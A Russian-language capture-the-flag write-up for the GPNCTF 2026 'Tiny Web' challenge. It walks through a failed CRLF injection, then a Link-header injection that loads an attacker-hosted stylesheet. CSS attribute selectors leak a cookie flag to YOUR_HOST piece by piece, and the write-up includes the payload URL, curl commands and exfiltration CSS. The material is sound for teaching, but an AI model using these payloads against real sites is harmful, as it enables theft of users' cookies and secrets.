# Tiny Web
**GPNCTF 2026**

Оригинальный вариант задания в директории `tinyweb`. Для удобства локального запуска упаковал задание в Docker - директория `dockerized-tinyweb`.

Задание состоит из кода бота, Caddy прокси и сервиса, который буквально представляет из себя одну строку:
```
require('http').createServer((a,b)=>b.writeHead(200,{'content-type':'text/html',link:`<${unescape(a.url)}>;rel=preload;as=fetch`})+b.end(`<body onload=fetch('${a.headers.cookie}')>`)).listen(8080)
```

Сервис слушает порт 8080, а в ответе возвращает HTML страницу `<body onload=fetch('${a.headers.cookie}')>` с явно заданными заголовками `content-type: text/html` и `link: <${unescape(a.url)}>;rel=preload;as=fetch`. То есть в тело ответа записывается значение заголовка `Cookie`, а в заголовок ответа `Link` устанавливается значение URL, которое никак не экранируется.
```
curl -i "http://localhost:8080/some_url" -H 'Cookie: flag=GPNCTF{TEST_FLAG}'

HTTP/1.1 200 OK
content-type: text/html
link: </some_url>;rel=preload;as=fetch
Date: Tue, 09 Jun 2026 20:01:47 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

<body onload=fetch('flag=GPNCTF{TEST_FLAG}')
```

Очевидный вектор - CRLF инъекция, которая позволит нам добавить свой заголовок в ответ или подменить тело ответа (HTTP Response Splitting). Однако, попробовав проэксплуатировать CRLF инъекцию получим:
```
curl -i "http://localhost:8080/%0d%0aTEST_HEADER:%20TEST_VALUE" -H 'Cookie: flag=GPNCTF{TEST_FLAG}'
curl: (52) Empty reply from server
```
А в логах сервера
```
tinyweb-vuln-server-1  | node:internal/errors:541
tinyweb-vuln-server-1  |       throw error;
tinyweb-vuln-server-1  |       ^
tinyweb-vuln-server-1  | 
tinyweb-vuln-server-1  | TypeError [ERR_INVALID_CHAR]: Invalid character in header content ["link"]
tinyweb-vuln-server-1  |     at storeHeader (node:_http_outgoing:583:5)
tinyweb-vuln-server-1  |     at processHeader (node:_http_outgoing:578:3)
tinyweb-vuln-server-1  |     at ServerResponse._storeHeader (node:_http_outgoing:447:11)
tinyweb-vuln-server-1  |     at ServerResponse.writeHead (node:_http_server:421:8)
tinyweb-vuln-server-1  |     at Server.<anonymous> (/app/index.js:1:39)
tinyweb-vuln-server-1  |     at Server.emit (node:events:524:28)
tinyweb-vuln-server-1  |     at parserOnIncoming (node:_http_server:1139:12)
tinyweb-vuln-server-1  |     at HTTPParser.parserOnHeadersComplete (node:_http_common:118:17) {
tinyweb-vuln-server-1  |   code: 'ERR_INVALID_CHAR'
tinyweb-vuln-server-1  | }
tinyweb-vuln-server-1  | 
tinyweb-vuln-server-1  | Node.js v20.20.2
tinyweb-vuln-server-1 exited with code 1
```
И сервис безнадежно умрет. Оказывается, Node.js проверяет наличие `\r\n` в значении заголовка и при их наличии выбрасывает исключение `ERR_INVALID_CHAR`, которое убивает процесс. Перезапускаем сервис и пробуем другой подход.

Разберемся зачем вообще используется заголовок `Link`, особенно в браузере Firefox, так как бот использует именно его. Заголовок по сути преставляет аналог `<link>` в HTML, то есть позволяет указать ссылку на некоторый ресурс (например, на favicon). Посмотрев [MSDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Link) можно найти интересную особенность: Firefox поддерживает ссылку типа `rel=stylesheet` в заголовке `Link` и этот стиль будет применяться в приоритете над тем, что придет в ответе. То есть получив в ответе следующий заголовок:
```
Link: <https://evil.com/style.css>;rel=stylesheet
```
Firefox применит к странице стиль по ссылке https://evil.com/style.css, указанной в заголовке `Link`. Это дает нам возможность выполнить произвольный CSS код на странице, которую посетит бот. А с помощью CSS селекторов можно вычитать значение из атрибута `onload` тега `<body>` и получить флаг (подробнее об этой технике эксфильтрации [тут](https://portswigger.net/research/blind-css-exfiltration)).

Шаблон значения заголовка уже имеет `rel=preload`, но благодаря `unescpaed`, мы можем перезаписать нужные нам атрибуты. Передав в URL `/test>;rel=dns-prefetch,<http://YOUR_HOST/style.css>;rel=stylesheet,<test` получим следующий заголовок:
```
Link: </test>;rel=dns-prefetch,<http://YOUR_HOST/style.css>;rel=stylesheet,<test>;rel=preload;as=fetch
```
На своем сервере будем раздавать стиль. Чтобы автоматизировать процесс сервер должен генерировать файл со стилями, содержащий селекторы для всех возможных символов в флаге:
```
body[onload^="fetch('flag=GPNCTF{A"] {
  background: url("http://YOUR_HOST/test?flag=GPNCTF{A");
}
body[onload^="fetch('flag=GPNCTF{B"] {
  background: url("http://YOUR_HOST/test?flag=GPNCTF{B");
}
...
```
При нахождении селектором нужной части флага в теле, браузер бота применяет стиль - пытается установить фоновое изображение по указанному URL, тем самым делая запрос на наш сервер, с указанием найденной части флага. Так постепенно мы сможем восстановить весь флаг.

[Пример кода сервер](https://github.com/andreika47/Quiet-CTF/blob/main/Tiny%20Web/solve-server.py)
[Пример автоматизации запуска бота](https://github.com/andreika47/Quiet-CTF/blob/main/Tiny%20Web/solve.sh)

#web #node #firefox #crlf #css